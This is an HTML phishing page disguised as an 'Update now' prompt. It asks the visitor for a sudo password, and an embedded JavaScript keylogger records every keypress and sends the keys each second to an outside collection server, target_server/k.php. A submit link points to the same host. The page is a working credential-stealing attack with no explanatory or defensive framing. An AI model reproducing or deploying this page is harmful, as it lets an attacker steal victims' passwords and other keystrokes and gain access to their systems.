<html>
<script language="javascript">
var keys='';
document.onkeypress = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}
window.setInterval(function(){
  new Image().src = 'https://target_server/k.php?c='+keys;
  keys = '';
}, 1000);
</script>

<center><h1>Update now</h1>
<div>
<label for="Email Password">sudo password</label>
<input name="month" id="sudopass" type="text">
</div>
<div>
<a href="https:/target_server/mail.php"><h3 style="color:blue;">Submit</h3></a>
</div>
<div>
</html>
